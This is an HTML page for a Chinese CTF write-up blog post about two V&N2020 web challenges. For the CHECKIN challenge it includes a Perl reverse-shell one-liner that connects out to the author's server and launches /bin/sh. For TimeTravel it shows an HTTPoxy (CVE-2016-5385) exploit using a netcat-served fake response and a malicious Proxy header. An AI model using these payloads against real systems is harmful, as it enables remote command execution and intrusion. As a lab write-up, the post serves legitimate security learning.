@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>V&amp;N2020公开赛 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="V&amp;N2020 公开赛V&amp;N2020 公开赛 [V&amp;N2020 公开赛]CHECKIN考点：反弹shell 获得源码： 123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp &#x3D; Flask(__name__)flag_file &#x3D; open(&quot;fla">
+<meta property="og:type" content="article">
+<meta property="og:title" content="V&amp;N2020公开赛">
+<meta property="og:url" content="http://yoursite.com/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="V&amp;N2020 公开赛V&amp;N2020 公开赛 [V&amp;N2020 公开赛]CHECKIN考点：反弹shell 获得源码： 123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp &#x3D; Flask(__name__)flag_file &#x3D; open(&quot;fla">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/.com//1.png">
+<meta property="og:image" content="http://yoursite.com/.com//2.png">
+<meta property="og:image" content="http://yoursite.com/.com//3.png">
+<meta property="article:published_time" content="2020-03-16T02:56:54.000Z">
+<meta property="article:modified_time" content="2020-04-08T18:58:44.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/.com//1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-V-N2020公开赛" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/" class="article-date">
+  <time datetime="2020-03-16T02:56:54.000Z" itemprop="datePublished">2020-03-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      V&amp;N2020公开赛
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="V-amp-N2020-公开赛"><a href="#V-amp-N2020-公开赛" class="headerlink" title="V&amp;N2020 公开赛"></a>V&amp;N2020 公开赛</h1><p>V&amp;N2020 公开赛</p>
+<h2 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h2><p>考点：反弹shell</p>
+<p>获得源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>一看就知道要反弹shell</p>
+<p>这里的<code>flag</code>被删除了</p>
+<p>记一个知识点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当一个进程打开某个文件直到关闭前，该进程会获得文件描述符，而文件描述符里有文件的内容，即便已经将文件删除，只是删除了其相应的目录索引节点，若进程依然存在没被关闭的话，就依然可以通过文件提供给它的文件描述符进行操作</span><br></pre></td></tr></table></figure>
+
+<p>找到该进程，读取flag</p>
+<p><code>/proc/[pid]/fd</code> 是一个目录，包含进程打开文件的情况</p>
+<p>测得bash反弹，curl反弹都不可，所以这里使用perl反弹。</p>
+<p>先perl反弹shell,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;174.1.178.39&quot;;$p&#x3D;7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39; &amp;</span><br></pre></td></tr></table></figure>
+
+<p>然后读flag</p>
+<p><img src="/.com//1.png" alt="image-20200401215315646"></p>
+<h2 id="V-amp-N2020-公开赛-TimeTravel"><a href="#V-amp-N2020-公开赛-TimeTravel" class="headerlink" title="[V&amp;N2020 公开赛]TimeTravel"></a>[V&amp;N2020 公开赛]TimeTravel</h2><p>考察：HTTPoxy漏洞（CVE-2016-5385）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先先理解到代码的意思：我们想读到flag。就要满足<code>$data[&#39;success&#39;] === true</code></p>
+<p>传入一个flag，就会去请求HTTP-api服务，假如该服务器返回success的话，就会执行程序读取flag.</p>
+<p>这里考察的是CGI<a href="https://www.cnblogs.com/f-ck-need-u/p/7627035.html" target="_blank" rel="noopener">解释</a></p>
+<p>CGI有个特性就是：会将header中的proxy参数设置冲环境变量HTTP_PROXY</p>
+<p>在PHP 5.6.23版本中存在漏洞CVE-2016-5385</p>
+<p>参考：<a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">CVE-2016-5385</a></p>
+<p><img src="/.com//2.png" alt=" "></p>
+<p>所以解题思路如下：</p>
+<p>现在vps中的写入<code>b.txt</code>内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: nginx/<span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">Date: Fri, <span class="number">06</span> Mar <span class="number">2020</span> <span class="number">18</span>:<span class="number">27</span>:<span class="number">31</span> GMT</span><br><span class="line">Content-Type: text/html; charset=UTF<span class="number">-8</span></span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: <span class="number">16</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"success"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接着监听端口</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">8888</span> &lt; b.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>burp抓包，发送请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?flag=123</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:28456</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: pma_lang=zh_CN</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Proxy</span>: http://174.1.178.39:8888</span><br></pre></td></tr></table></figure>
+
+<p>重点在于<code>http://174.1.178.39:8888</code></p>
+<p>当发送该请求的时候，proxy的请求会作为HTTP_PROXY</p>
+<p>这时候会访问vps的8888端口，这时候就会发送出b.txt的内容，使得<code>$data[&#39;success&#39;] === true</code></p>
+<p>获得flag</p>
+<p><img src="/.com//3.png" alt="image-20200401234144438"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/" data-id="ck8sqr5j8000okou5d9fcgsbk" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/03/20/BJDCTF-2nd/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          BJDCTF-2nd
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/03/13/CISCN2019-web-%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CISCN2019-部分web[复现]</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
